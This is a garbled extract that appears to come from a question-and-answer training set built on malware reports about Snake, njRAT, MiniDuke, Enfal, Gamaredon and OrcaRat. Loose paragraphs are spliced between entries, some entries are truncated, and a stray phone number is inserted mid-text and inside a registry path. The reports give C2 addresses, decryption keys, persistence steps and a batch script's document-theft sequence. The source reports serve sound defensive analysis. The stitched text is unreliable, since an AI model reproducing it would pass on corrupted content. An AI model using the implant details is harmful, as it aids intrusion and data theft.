    "output": "A: Traditional network controls and endpoint anti-virus solutions are ineffective against micro-targeted malvertising campaigns like Operation DeathClick due to several reasons. Firstly, these campaigns evade detection by constantly changing malware hashes, rendering signature-based detection methods obsolete. Secondly, the short lifespan of malvertising landing pages, which appear and disappear within minutes, makes it challenging for web proxy blocking updates to keep up. Additionally, intelligence feeds based on hostname, IP, URL, or domain cannot block malicious malvertisers quickly enough. To protect users from such attacks, solutions like Invincea can be employed, which allow users to browse and click anything online without fear of compromise. Non-Invincea users can attempt to opt out of directed targeting, although this approach has limitations, as it primarily relies on cookies and does not address IP-based targeting.",

The particular version we analyzed was NewCT version 2. The implant has persistence mechanisms and contains functionality to perform command and control communication. This backdoor also has functionality to load additional plugins from the command and control server. It exports the following two functions:\nSendData\nCreateInstance\nIt creates a mutex \"HFRM_\" to ensure there is only one running copy of the backdoor. It ensures this by checking if the return value from CreateMutexA is 183 (\\xB7), which corresponds to \"ERROR_ALREADY_EXISTS\"9.\nThe payload emits the \"POST\" network beacon shown below along with stub data.

The function call location is represented by the textual values shown in the table below and is selected using a switch case statement as shown in Figure 12. It is used by the attacker to track the call path that resulted in the network beacon.

In this case, the \"CT\" implant is 10 MB in size, as it has padded null bytes at the end of the file to increase file size in a possible attempt to evade AV engines as described in the previous section on evasion techniques.

    "instruction": "Context: Big Headline: NDIS PROTOCOL DRIVER\nThe Snake rootkit registers itself as Network Driver Interface Specification (NDIS) protocol driver.\nIntercepting Network Data\nWhenever the underlying miniport driver receives data from the network, it calls NDIS by invoking a data receive indication function NdisMIndicateReceiveNetBufferLists().\nWhen that happens, NDIS invokes Snake's hook function (ProtocolReceiveNetBufferLists) to process the received data.\nTo send the data back, the protocol driver defines the data in a list of NET_BUFFER_LIST structures, and then passes them to NDIS by calling NdisSendNetBufferLists().\nNDIS, in turn, calls the miniport driver's MiniportSendNetBufferLists() function to forward the data to an underlying miniport driver.\nBeing able to fully manipulate traffic at 3 different levels (NDIS protocol driver, TDI Driver, and WPF callout driver), Snake is able to 'inject' the traffic into existing communications to reach out to external components, and at the same time parse all incoming traffic to detect traffic addressed to itself:\nBig Headline: DEAD BEEF ON A COOL BASE\nAs the driver intercepts all connections (e.g. on TDI_RECEIVE TDI event or ClientEventReceive() event notification triggered through its TDI Filter Driver), it parses all incoming HTTP and SMTP traffic to see if it can be authenticated as Snake traffic.\nThe authentication is implemented by decrypting the data and making sure it starts with the markers 0xDEADBEAF and 0xC001BA5E (which appear to derive from 'DEAD BEEF' and 'COOL BASE').\nHere are specific steps:\n\u2022 The data it accepts should start from a 10 byte signature with the following rules:\n\u2022 the first 8 bytes must all be ASCII characters, the parser calculates their total sum (sum):\n\u2022 9th byte must be equal to sum / 26 + 65\n\u2022 10th byte must be equal to 122 - sum % 26\n\u2022 Starting from the 11th byte, the data must be base64-encoded; the parser decodes that data\n\u2022 Once decoded, the decrypted data should contain the aforementioned markers:\n; return marker here\n; traffic's buffer length\n; traffic's buffer pointer\n; decrypt traffic first\n; if failed, exit\n; check the returned marker\n; _DEADBEAF dd 0DEADBEAFh\n; if not 0xDEADBEAF, exit\n; check next DWORD\n; if not 0xC001BA5E, exit\n\u2022 When the traffic is authenticated, its contents is then parsed by using \"GET\", \"POST\", \"http://\", \"HTTP/\",  \"Content-Length\", \"Connection\", \"close\" tags, in order to retrieve HTTP requests\n\u2022 SMTP traffic is also parsed, only by using \"MAIL \", \"RCPT \" tags in order to retrieve SMTP characteristics\nBy observing such behaviour, one might wonder why the driver is expecting HTTP or SMTP clients? Why does it act like HTTP/SMTP server processing client traffic, and serving back normal responses as per the protocol?\nFor example, in HTTP the driver will respond with messages like \"HTTP/1.1 200 OK\" or \"HTTP/1.1 500 Server Error\".\nFor SMTP traffic, it communicates back normal SMTP server responses, such as \"250 Sender OK\", \"503 Bad sequence of commands\", etc.\nThe reason behind such behaviour is that the driver is acting in this mode like a proxy, routing requests from other infected hosts to a remote C&C server.\nAnother opportunity this mode unlocks is a peer-to-peer network mode with no centralised C&C. The infected hosts are capable of transferring the following peer-2-peer commands defining fragment size, reliability parameters, new peer information, peer impersonation flags, etc.:\n\u2022 frag_size\n\u2022 frag_no_scrambling\n\u2022 peer_frag_size\n\u2022 read_peer_nfo\n\u2022 write_peer_nfo\n\u2022 imp_level\n\u2022 reliable_n_tries\n\u2022 reliable_keepalive\n\u2022 reliable_rtt\n\u2022 reliable_padding\n\u2022 reliable_no_keepalive\n\u2022 m2b_raw\n\u2022 psk\n\u2022 key\nOnce the incoming data is authenticated and decrypted, the driver passes it to the DLL by using memory pipes.\nFor example, on HTTP traffic arrival it may send traffic data into a memory pipe \\Device\\NamedPipe\\isapi_http, and then, send a received peer-2-peer command message write_peer_nfo=[IP_ADDRESS:PORT]0frag_no_scrambling=Y0 into another memory pipe called \\Device\\NamedPipe\\isapi_dg.\nIn order to log its activity, the driver writes log data into the pipe \\Device\\NamedPipe\\isapi_log, so that the DLL could log the data into the log files.\nFull list of the named pipes used for communications is provided below:\n\u2022 \\Device\\NamedPipe\\isapi_http\n\u2022 \\Device\\NamedPipe\\isapi_log\n\u2022 \\Device\\NamedPipe\\isapi_dg\n\u2022 \\Device\\NamedPipe\\services_control\nMessages submitted into the pipes are wrapped into the structures. The structures appear to contain headers to allow the pipe server, that runs within an infected userland module, to identify the messages first and then unwrap the structures accordingly.\nFor example, the message headers could be:\n\u2022 domc.np\n\u2022 frag.np\nOnce received from the pipes and unwrapped/decoded, the data is then handled by the usermode DLL as per the data intention - whether it's a traffic sniffing task, a peer-2-peer client logic, a logging task, or a task of saving received files into the virtual volumes.\n\nQuestion: How does the Snake rootkit facilitate peer-to-peer communication among infected hosts, and what types of commands and data are exchanged through this mechanism?\n\nAnswer:",
    "output": "The Snake rootkit facilitates peer-to-peer communication by acting as a proxy and routing requests from other infected hosts. This mode allows for a decentralized network without a centralized C&C server. Infected hosts can exchange various peer-to-peer commands that define fragment size, reliability parameters, new peer information, and peer impersonation flags. Examples of these commands include 'frag_size', 'frag_no_scrambling', 'peer_frag_size', 'read_peer_nfo', 'write_peer_nfo', 'imp_level', 'reliable_n_tries', 'reliable_keepalive', 'reliable_rtt', 'reliable_padding', 'reliable_no_keepalive', 'm2b_raw', 'psk', and 'key'. Once the incoming data is authenticated and decrypted, the driver passes it to the DLL using memory pipes such as \\Device\\NamedPipe\\isapi_http and \\Device\\NamedPipe\\isapi_dg. The DLL then handles the data according to its intended purpose, such as traffic sniffing, peer-to-peer client logic, logging tasks, or saving received files into virtual volumes. This peer-to-peer communication enhances the resilience and flexibility of the Snake malware, making it harder to disrupt its operations.",

At the moment of writing this report, the functionality was not confirmed. When the option is selected, the malware searches Mozilla Firefox, Google Chrome, Opera directories.\n- Open a 'Server' window\no This window allows the attacker to Update, Uninstall, Restart, Close, Disconnect, or Rename the malware running in the Victim system\n- Open an 'Open Folder' window\no This window open the local folder in the attackers machine in which the artifacts collected through the \"njRAT\" GUI are stored in his/her system\n- Open a 'Builder' Window\no This window allows the attacker to build new Clients to be deployed to Victims or used in attack campaigns. Some of the options in this builders allows the attacker to configure:\n\u25aa C2 node IP\n\u25aa C2 node port\n\u25aa Vic Tim Name (Looks like this could be used to identify the attack campaign)\n\u25aa Malware name (when it makes a copies itself)\n\u25aa Directory to make a copy of the malware when it is executed\n\u25aa Capabilities to spread via USB\n\u25aa Select the malware icon\n\u25aa Protect the malware process\n\u25aa Stub Randomization\nThe following is a screenshot of the \"njRAT\" v.0.5 CnC GUI when a Victim system connects to it:\nThe following \"About\" information was observed in this version (0.5.0) of the C2 server software found online:\nThe following screenshot shows the Builder interface and default parameters:+1800.652.4020\nThe \"Authorization.exe\" malware has keylogger functionality. It stores the logged keystrokes in the following file: \"[CWD]\\.tmp\". When the malware is dropped by the \"Authorization form may - 2013 - 115444.scr\" carrier file, the logged keystrokes are stored in: \"C:\\Extracted\\.tmp\".\nThe IP address used by the Command & Control (C2) node appears to be under an IP range owned by: \"Palestinian Internet Services, P. O. BOX 5111 Gaza City, Palestine\".\nVariants of this malware have been observed by the community since at least 2012. The malware appears to be known by the community as: njRAT, MSIL/Bladabindi, and Backdoor.LV.\nWhen the \"Authorization.exe\" malware is executed it:\n- Creates a copy of itself in the following locations:\no %APPDATA%\\msnco.exe\no C:\\Documents and Settings\\%USERNAME%\\Start Menu\\Programs\\Startup\\b6554e5bcfef391ff7a7ffda58092e10.exe\n- Tries to open the following file: [CWD]\\ Authorization.exe.config\n- Entrenches in the system for persistence in the following registry locations:\no HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Ru n\\b6554e5bcfef391ff7a7ffda58092e10\no HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\R un\\b6554e5bcfef391ff7a7ffda58092e10\nMakes the following modifications to the registry to bypass the Windows Firewall:\no Key: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAcc ations\\List\\[%APPDATA%]\\msnco.exe +1800.652.4020ess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplic\no Value: [%APPDATA%]\\msnco.exe:*:Enabled:msnco.exe\n- Beacons to the following C2 node over TCP port 1177: \"217.66.231.245\"\nThe attacker tries to make sure the malware will run in the system by making the second copy into the above mentioned directory (C:\\Documents and Settings\\%USERNAME%\\Start Menu\\Programs\\Startup\\b6554e5bcfef391ff7a7ffda58092e10.exe)\no This causes the malware to execute again when the system is rebooted and re-starts the infection in the system. Once the system is infected again, it will beacon to the C2 node.\nThe attacker tries to trick the user by using different icons for the malware. Various samples were observed with MS Word and PDF icons. The following is a screenshot of how the file will look like to a normal user:\nWhen the system is configured to show file extensions, the EXE extension is now revealed:\nWhen the malware connects to the C2 node, it will send information about the victim system, malware version, open windows, etc. The following is the network traffic observed:\nlv|'|'|TndfQzQyNjRFQkI=|'|'|VICTIM|'|'|Examiner|'|'|2013-06-21|'|'|USA|'|'|Win XP ProfessionalSP2 x86|'|'|No|'|'|0.5.0E|'|'|..|'|'|Y3B0YnRfUHJvY2Vzc19SZWdpc3RyeV9GaWxlX0luZm8ubG9nIC0gTm90ZXB hZA==|'|'|[endof]act|'|'|\nY3B0YnRfUHJvY2Vzc19SZWdpc3RyeV9GaWxlX0luZm8ubG9nIC0gTm90ZXBhZA== [endof]\nInformation sent by the attacker on opened windows in the system could inform him/her of his malware being analyzed and allowed to connect to the C2 node. For example, if Wireshark, Filemon, Regmon, and IDA are opened in the system when the analyst executes the malware, this will quickly let the attacker know that someone is performing reverse engineering of his malicious code.\nThe following WHOIS information was found related to the C2 node (217.66.231.245): inetnum: 217.66.228.0 - 217.66.231.255 netname: AV_FXD_RA descr: AV_FXD_RA +1800.652.4020\nThe \"Authorization.exe\" variant in this report appears to have been available at some point through the following URL: \"hxxp://bongdacongdong.vn/authorization.exe\".

To decrypt each segment Ei and obtain the original data Di, the following operation is performed: Di = rc4(md5(custom_debase64(E3)+master_key)).decrypt(Ei). Here, the 'master_key' is a crucial component; for the OrcaRat sample, the 'master_key' is 'OrcaKiller'. This key is combined with the custom debased64 value of E3, hashed using MD5, and then used as the key for the RC4 decryption algorithm to decrypt each segment Ei.",

    "instruction": "Context: Big Headline: Backdoor analysis\nThe backdoor has a single export, which for instance is named \"JorNgoq\" in the Hungarian case. When this export is called at load, the backdoor sets the \".rdata\" section's permissions to \"RWX\" and sets the mutex to a hardcoded string \"nljhfdb\".\nThe entrypoint of the library (DllMain) is obfuscated and the main body of the malware is encrypted. The encryption is rather simple: the \".rdata\" section of the library is ROL'ed with a linear key and XOR'ed with a fixed key. Both keys are derived from the length of the encrypted part.\nDecryption loop in the obfuscated code. 0x4522 is the actual size of the encrypted part\nOnce finished decrypting, the library proceeds to the real \"main\" function. The main part of the library is written in Assembler, in an \"old-school\" manner typical for low-level viruses. The code is position independent; it has no imports and resolves API function addresses by hash values of their names.\nTypical low-level malware programming style: passing strings as parameters via call, addressing API functions by hash values\nThe backdoor maintains seven call addresses that each maintain their own block of functionality.\nThe first block calls GetAsyncKeyState twice, checking for a mouse click, which indicates user activity in the system. The second block searches for all \"*.exe\" and \"*.dll\" files located in the %temp% directory. The third block fetches information about the infected system with calls to gather information about the CPU, drive and the computername - these are used to decrypt the backdoor's main body, which is custom encrypted for each unique victim.\nThe fourth block attempts to maintain self-protection from malware analysis. Below is the list of tools (and VMware) that it attempts to identify and protect against. It fetches the list of running processes on the system and attempts to identify if these tools are among them:\napispy32.exe, apimonitor.exe, winapioverride32.exe, procmon.exe, filemon.exe, regmon.exe, winspy.exe, wireshark.exe, dumpcap.exe, tcpdump.exe, tcpview.exe, windump.exe, netsniffer.exe, iris.exe, comview.exe, ollydbg.exe, windbg.exe, odb.exe, ImmunityDebugger.exe, syser.exe, idag.exe, idag64.exe, petools.exe, vboxtray.exe, vboxservice.exe, procexp.exe, vmtools.exe, vmwaretray.exe, vmwareuser.exe\nIf any of the tools above are detected on the system, the malware will continue running on the system without further decrypting its code and exhibiting any other functionality. This will prevent it from doing any outbound communications with Twitter accounts, as described below. In other words, it will attempt to appear non-functional, especially to automated analysis, hiding its true nature behind its layers of encryption.\nUser agent strings for web browsers like Opera, Mozilla and Internet Explorer are decrypted and used for all Internet access. Oddly, there are Linux versions included as well:\n(Windows NT 5.1; (Windows NT 6.0; (Windows; U; Windows NT 5.2; (X11; Linux i686; (X11; Linux x86_64; (compatible; MSIE 6.0; Windows NT 5.0; (compatible; MSIE 7.0; Windows NT 6.0; (compatible; MSIE 9.0; Windows NT 6.1;WOW64) ;Trident/4.0) ; Trident/5.0) ; WOW64; Trident/5.0) ; SV1) )\nThe fifth and sixth code blocks are most interesting. They calculate the SHA1 of main system information which will be used in the C2 interaction later.\nFollowing the SHA-1 hash generation, the backdoor will base64 encode its unique hash for later C2 communication.\nThe malware is activated upon reboot of the infected machine. To gain control at boot, it writes a randomly named LNK file to the startup folder, which in turn calls the main body using rundll32:\nIn the picture above, the malware's main body is stored as \"stat.bin\" (a randomly selected name) in the \"Adobe\" folder. The LNK file calls it only exported function, \"ImqRgno\".\nOnce activated, the malware will first contact Twitter and look for posts from some very specific accounts. These accounts should have posted an encrypted string which contains the magic identifier \"uri!\", then an encrypted c2 string.\nWe presume many other Twitter accounts exist with similar parameters.\nThe encrypted \"uri!\" holds a different c2 for each version of the malware:\nIt's most likely that these websites have been hacked by the attackers and injected with the command and control PHP script.\nSecondly, the malware will connect to \"\" to obtain information about the victim's location.\nInterestingly, the backdoor has another update/c2 functionality. It searches Google for a very specific string:\nThe string \"lUFEfiHKljfLKWPR\" which the malware seeks on Google\nThe pages found by the Google search may hold an update \"uri\" similar to the one from Twitter. We can assume the attackers wanted to have a second channel for updates in case the Twitter accounts are closed.\nBig Headline: Stage 2\nThe \"index.php\" on the C2 serves a fake GIF file to the victim, depending on the parameters it receives. Here's what one of these GIF files looks like:\nHere's one example of a malicious request for the C2 domain \"arabooks*dot+ch\":\narabooks.ch/lib/index.php?ia=TJ2b7uzMuh4fnt2n7aJisckAj6pEvkLPPsmk5gC77rPeYKmj8z58UWS1szY0FGzkp[REMOVED]lhUDx vzo1_IpYHfDI2MTg2NTM5OTF8MS4xMw==\nThe picture from the GIF file is actually very small and reminds us of the method used by Duqu back in 2011 to hide data, known as 'steganography':\nAt offset 0x6a4 inside the GIF file, there is a hidden encrypted PE file. The encryption scheme used a DWORD key also stored in the GIF file that is rotated. Effectively, this translates to an 8 byte long XOR key. The resulting encryption key used in the Hungarian attack for instance is {0xD2, 0x2A, 0xA2, 0x27, 0x79, 0x95, 0x52, 0x2D}. In the Belgian attack, it is {0xC5, 0x5E, 0xEE, 0xE5, 0x51, 0x11, 0x17, 0x7C}. For the Luxemburg attack, the key is {0x91, 0x18, 0x8C, 0xC1, 0x1C, 0xC9, 0x9C, 0xC9}.\nDecrypted payload from the fake GIF file served by the C2\nThe decrypted PE file (plugin / payload) is also written in assembler and, once again, it is encrypted with the same algorithm as the backdoor originally deployed in the system. We refer to it as \"stage 2\". The main backdoor body saves the plugin with different names, for instance, it can be \"xml.dat\" and tries to run its only export using rundll. In our case, this didn't appear to work very well:\nSeveral different variants of the 2nd stage backdoors have been observed on the C2; they all perform similar functions but are encrypted with different keys and contact different C2s.\nMedium Headline: Command & control server information\nThe malware connects to several C2s depending on the information available on the control Twitter accounts or on Google. For instance, on \"artas*dot+org\" it connects to \"/engine/index.php\". Interestingly, the \"img\" subfolder allows listings and we can see several variants of the backdoor encrypted as GIF files:\nOn \"tsoftonline*dot+com\", the folder has the same structure:\nInterestingly, on \"tsoftonline*dot+com\" we have several other files with different kind of names and sizes. They are larger and follow a different naming scheme: \"*number+.gif\". We believe they are custom backdoors delivered only to specific victims by the attackers. We refer to these as \"stage 3\".\nBig Headline: Stage 3\nWhile we were analyzing the samples, the attackers connected to the C2 and added a custom backdoor as \"1109821546.gif\":\n\"http://tsoftonline.com/views/img/1109821546.gif\"\nHTTP/1.1 200 OK\nDate: Mon, 25 Feb 2013 12:34:13 GMT\nServer: Apache\nMon, 25 Feb 2013 10:59:49 GMT\nLast-Modified:\nETag: \"7c8251-5190d-4d68a708d9340\"\nAccept-Ranges: bytes\nContent-Length: 334093\nContent-Type: image/gif\nThis custom backdoor, referred to as \"stage 3\", is much bigger than the previous ones \u2013 300K+ in size. This is because the attackers used large layers of obfuscation code, including UCL compression. So far, we have observed two variants of the 300K \"stage 3\" backdoor. The PE compilation timestamp for both is \"Mon Jun 18 17:28:11 2012\". The number \"1109821546\" in the filename refers to the unique victim ID. In this case, we were able to determine that the victim is based in Portugal.\nThe backdoor connects to the following C2 for instructions:\nnews[dot]grouptumbler[dot]com/news/feed.php IP: 200.63.46.23\nIt supports several commands, such as copy file, move file, remove file, make directory, kill process and of course, download and execute new malware.\nThe server at 200.63.46.23 is hosted in Panama:\nWe presume that it was hacked by the attackers and is currently used as a command server for the attacks.\nMD5 hashes for the known \"Stage 3\" backdoors:\nIn addition to the ~300K \"stage 3\" backdoors, we've observed a 13K module (MD5: 6bc34809e44c40b61dd29e0a387ee682).This module will connect to an IP in Turkey, get the response, decrypt it in memory and execute it. The C2 is:\n85.95.236.114\nThe module has a compilation timestamp of \"Tue Nov 13 14:30:12 2012\".\nMedium Headline: Map of victims\nThe C2s maintain a detailed, encoded log of the victims connecting to the servers. The logs are available to anyone who knows the exact filename. By collecting the logs from all the known command servers, we've discovered connections from several high profile networks belonging to:\nBy analyzing the logs from the command servers, we have observed 59 unique victims in 23 countries: Belgium, Brazil, Bulgaria, Czech Republic, Georgia, Germany, Hungary, Ireland, Israel, Japan, Latvia, Lebanon, Lithuania, Montenegro, Portugal, Romania, Russian Federation, Slovenia, Spain, Turkey, Ukraine, United Kingdom and United States. The amount of high profile victims in this attack is notable and puts it on the same level with other advanced campaigns such as \"Red October\".\nAnswer this question: What techniques does the MiniDuke backdoor use to avoid detection and analysis, and how effective are these methods?",
    "output": "The MiniDuke backdoor uses several techniques to avoid detection and analysis. It checks for the presence of various security tools and virtual machines, and if any are detected, it continues running without decrypting further code or exhibiting additional functionality. This approach helps the malware evade automated analysis and remain undetected. Additionally, the backdoor uses position-independent code and resolves API function addresses by hash values, making it harder to analyze statically.",

    "instruction": "Medium Headline: 3.3.1 Malware Connections: Enfal\nOne of our objectives in this report was to explore the broader ecosystem of malware. While analysis of individual attacks may yield interesting data, a broader understanding of connections between malware networks allows us to better understand the methods, targets and capabilities of the attackers. Based on the malware tools and  command and control infrastructure collected as part of the Shadows in the Cloud investigation we were able to draw connections between the Shadow network and at least two other, possibly affiliated, malware networks.\nWhen grouping malware networks together we interpret relationships between the command and control infrastructures, characteristics of the malware, attack vectors and exploits used, and any identifying information left behind by the attackers. This allows us to track the activities of similar yet distinct groups of attackers over time. More importantly, this historical perspective allows us to apply a granular level of analysis when investigating attacks, rather than simply grouping attackers and malware together by the country of origin. When grouping malware we focus on:\n\u2462 IP address relationships - the historical relationship between command and control domains that resolve to same IP addresses over time.\n\u2462 Malware connection relationships - malware found on one command and control server that connects to a different command and control server.\n\u2462 Malware file path relationships - the presence of distinctive file paths on multiple command and control servers.\nThere are limitations to this approach. For example, multiple attackers could operate on a common infrastructure, perhaps supplied by a group that specialises in malicious hosting or selling registered domain names to be used as command and control servers. Different groups of attackers could use the same, or very similar, malware. However, when the malware is not publicly available or for sale, its use remains limited. During the Shadow investigation we found the Enfal trojan among the instances of malware used by the attackers. The Enfal trojan is not widely available and appears to be in use by affiliated malware networks that sometimes share a common command and control infrastructure.\nIn fact, domain names that have been used as Enfal command and control servers by separate, but possibly affiliated, attackers \u2014 assam2008.net, msnxy.net, sysroots.net, womanld.com, womannana.com, lookbyturns. com, macfeeresponse.com and macfeeresponse.org \u2014 have now been incorporated into our sinkhole project. This allows us to observe compromised computers that are still checking in with the command and control servers as well as the file paths being requested. In some cases, we can obtain the names of documents located on the compromised computers. These domain names are associated with Enfal and can also be linked to the active command and control servers in the Shadow network through common command and control server IP addresses.\nAnother group of attackers that also used the Enfal trojan were documented in 2008 by Maarten Van Horenbeeck. He published information concerning his investigation into the targeted malware attacks which included the use of the Enfal Trojan dating back to 2007. Van Horenbeeck systematically documented a series of targeted attacks and clearly articulated the methodology of the attackers, one of which is now commonplace. The attackers leverage social engineering tactics to entice the target into clicking on a malicious link or email attachment. The malware then exploits a vulnerability in the user's client side software, such as a browser, Microsoft Word, Adobe Reader and so on, and begins communicating with a command and control server. Enfal is recognisable due to the consistent filenames the malware requests from the command and control server, most notably \"/cgi-bin/owpq4.cgi\". Van Horenbeeck identified domain names used by Enfal, *.bluewinnt. com and *.ggsddup.com, which are still in use today (Van Horenbeeck 2008a; Van Horenbeeck 2008b; Van Horenbeeck 2007).\nWhile we were unable to find any instances of common command and control infrastructure between the Enfal network that Van Horenbeeck documented, the methods and tools of these attackers and the Shadow network are very similar. The common use of the Enfal Trojan suggests that the attackers may be exchanging tools and techniques. The profile of the victims from two separate Enfal-based networks in our DNS sinkhole suggest that the attackers have an interest in compromising similar sets of targets. Finally, the failed DNS resolution for www.assam2008.net found on a computer at the OHHDL also compromised by the Shadow network indicates a possibly closer connection, or that they at least have both common tools and target sets.\n\nAnswer this question based on the above context: What specific characteristics of the Enfal trojan indicate its limited availability and potential affiliation with other malware networks? How does the sinkhole project aid in monitoring compromised computers associated with Enfal?",
    "output": "The Enfal trojan is not widely available and appears to be in use by affiliated malware networks that sometimes share a common command and control infrastructure.

This allows researchers to observe compromised computers that are still checking in with the command and control servers, as well as the file paths being requested.

    "instruction": "Big Headline: Custom Implants\nWhile the most recent samples observed still use batch scripts and SFX files, the Gamaredon Group has moved away from applications like wget, Remote Manipulator Tool, VNC and ChkFlsh.exe. Instead of using wget the attackers are distributing custom developed downloaders, and instead of Remote Manipulator or VNC the malware is using a custom developed remote access implant.\nIn June of 2015 a custom downloader used by many newer samples was first seen in the wild and is often included in SFX implants with the name \"LocalSMS.dll\". This downloader makes requests to adobe.update-service[.]net (hardcoded in the sample) and is further discussed in Appendix A.\nIn February 2016, another custom tool now often included in SFX implants was seen in the wild. This SFX file (3773ddd462b01f9272656f3150f2c3de19e77199cf5fac1f44287d11593614f9) contains a new Trojan (598c55b89e819b23eac34547ad02e5cd59e1b8fcb23b5063a251d8e8fae8b824) we refer to as \"Pteranodon.\" Pteranodon is a custom backdoor which is capable of the following tasks:\nCapturing screenshots at a configurable interval and uploading them to the attacker\nDownloading and executing additional files\nExecuting arbitrary commands on the system\nThe earliest version of Pteranodon uses a hardcoded URL for command and control. It sends POST requests to \"msrestore[.]ru/post.php\" using a static multipart boundary:\n\u2014\u2014\u2014\u2014870978B0uNd4Ry_$\nNewer versions of the tool also use hardcoded domains and multipart boundaries. They also share similar pdb strings. Other Pteranodon samples can be found in AutoFocus using the (<https://autofocus.paloaltonetworks.com/#/tag/Unit42.Pteranodon>)Pteranodon tag. The most recent variant of Pteranodon is analyzed in Appendix A.\nWe have only identified one delivery vector for the new implants thus far. A Javascript file (f2355a66af99db5f856ebfcfeb2b9e67e5e83fff9b04cdc09ac0fabb4af556bd) first seen in December of 2016 downloads a resource from http://samotsvety.com[.]ua/files/index.pht (likely a compromised site used for staging payloads) which previously an SFX file (b2fb7d2977f42698ea92d1576fdd4da7ad7bb34f52a63e4066f158a4b1ffb875) containing two of the Gamaredon custom tools.\nA related sample (e24715900aa5c9de807b0c8f6ba8015683af26c42c66f94bee38e50a34e034c4) used the same distinct Mutex and contains a larger set of tools for analysis. The original name of the file is \"AdapterTroubleshooter.exe\" and the file uses icons which resemble those used by OpenVPN, as seen below.\nUpon examining the sample's file activity within AutoFocus it is clear the sample is a self-extracting executable.\nOpening the sample with 7zip inside of a virtual machine, all the files contents can be examined. Below is a table providing the SHA256 values, the filenames, the compile timestamps and the pdb paths of the contents of the SFX file.\nThe bootstrapping logic for the sample relies on the contents of \"condirs.cmd\". Briefly, the logic within \"condirs.cmd\" follows:\n1. Ensure \"%LOCALAPPDATA%\\Microsoft\\Windows\\\" exists\n2. Kill and delete processes, files, and scheduled tasks which may interfere with the sample executing\n3. Copy \"winrestore.dll\" to \"%LOCALAPPDATA%\\Microsoft\\Windows\\UsrClass.dat{4f6fe187-7034-11de-b675-001d09fa5win}.dll\"\n4. Copy \"OfficeUpdate.dll\" to \"%LOCALAPPDATA%\\Microsoft\\Windows\\UsrClass.dat{4f6fe187-7034-11de-b675-001d09fa5off}.dll\"\n5. Determine if the operating system is Windows XP or Windows 7\n6. If the system is running Windows XP\na. Set the directory to copy files into as \"%WINDIR%\\Setup\\State\\Office\"\nb. Copy \"UsrClass.lnk\" to \"%USERPROFILE%\\\u0413\u043b\u0430\u0432\u043d\u043e\u0435 \u043c\u0435\u043d\u044e\\\u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b\\\u0410\u0432\u0442\u043e\u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0430\\\"\nc.

If the system is running Windows 7\na. Set the directory to copy files into as \"%APPDATA%\\Microsoft\\Office\"\nb. Copy \"UsrClass.lnk\" to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\nc. Copy \"SmartArtGraphicsLog.lnk\" to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\n8. Copy \"winrestore.dll\" to the directory set in step 6 or 7a with the filename \"MSO1234.win\"\n9. copy \"LocalSMS.dll\" to the directory set in step 6 or 7a with the filename \"MSO1567.dls\"\n10. copy \"OfficeUpdate.dll\" to the directory set in step 6 or 7a with the filename \"MSO5678.usb\"\n11. copy \"MpClients.dll\" to the directory set in step 6 or 7a with the filename \"MSO8734.obn\"\n12. Execute the exported function \"updater\" within \"MSO1234.win\" using rundll32.exe\n13. Execute the exported function \"EntryPoint\" within \"MSO1567.dls\" using rundll32.exe\nIt should be noted that \"UsrClass.lnk\" links to \"%WINDIR%\\system32\\rundll32.exe UsrClass.dat{4f6fe187-7034-11de-b675-001d09fa5win}.dll,updater\" and \"SmartArtGraphicsLog.lnk\" links to \"C:\\WINDOWS\\system32\\rundll32.exe UsrClass.dat{4f6fe187-7034-11de-b675-001d09fa5off}.dll,StartBackup\". These are the locations \"winrestore.dll\" and \"OfficeUpdate.dll\" were copied to in steps 3 and 4, respectively.\nThe \"condirs.cmd\" script then continues to:\n1. Schedule the following tasks:\na. Task name \"UpdatesWinRes\", invoke \"MSO1234.win,updater\"\nb. Task name \"UpdatesWinDLL\", invoke \"MSO1567.dls,EntryPoint\"\nc. Task name \"UpdatesWinUSBOOK\", invoke \"MSO5678.usb,StartBackup\"\nd. Task name \"UpdatesWinOBN\", invoke \"MSO8734.obn,bitDefender\"\n2. Ensure the directory \"%Temp%\\reports\\ProfileSkype\\\" exists\n3. Kill processes named \"skype.exe\"\n4. Copy the contents of \"%AppData%\\Skype\" to \"%Temp%\\reports\\ProfileSkype\\\"\n5. Create subdirectories under \"%Temp%\\reports\\%COMPUTERNAME\\\" with names: Z W P S V Q N M L K I J F H E G and D. These are drive letters.\n6. Copy all files from all above drive letters with extensions \"doc\", \"docx\", \"xls\", \"xlsx\", \"rtf\" \"odt\" and \"txt\" into \"%TEMP%\\reports\\%COMPUTERNAME%\\%%d\\\" where %%d is the drive letter\n7. Copy all files with the above extensions from all users' \"Desktop\", \"Documents\", and \"Downloads\" folders to \"%TEMP%\\reports\\%COMPUTERNAME%\\Desktop\\\",\n\"%TEMP%\\reports\\%COMPUTERNAME%\\Documents\\\" and \"%TEMP%\\reports\\%COMPUTERNAME%\\Downloads\\\" respectively\n8. Execute the exported function \"StartBackup\" within \"MSO5678.usb\" using rundll32.exe\n9. Execute the exported function \"bitDefender\" within \"MSO8734.obn\" using rundll32.exe\n10. Clean up temporary files, sleep, and delete itself\nWhen this script has completed, a series of implants giving the attacker the ability to steal files, capture screenshots and evade detection are deployed on the system. These individual implants are analyzed in detail in Appendix A.\n\nHow does the Gamaredon Group use self-extracting executables (SFX) to deploy their custom tools, and what are the key components and actions performed by these SFX files?",
    "output": "The Gamaredon Group uses self-extracting executables (SFX) to deploy their custom tools. One example is an SFX file containing a JavaScript file that downloads resources from a compromised site, which in turn downloads another SFX file containing multiple custom tools. The SFX file 'AdapterTroubleshooter.exe' uses icons resembling those of OpenVPN to disguise its true purpose. Upon execution, the SFX file extracts its contents, including DLLs and batch scripts, and performs a series of actions to ensure persistence and data exfiltration. Key components include 'condirs.cmd,' which handles the bootstrapping logic, and various DLLs like 'winrestore.dll,' 'OfficeUpdate.dll,' 'LocalSMS.dll,' and 'MpClients.dll.' These components work together to copy themselves to strategic locations, create shortcuts, schedule tasks, and collect sensitive files from the system.",

    "instruction": "Write an answer to the following question: How does the BlackEnergy APT group's use of spearphishing with Word documents relate to Network Denial of Service attacks?",
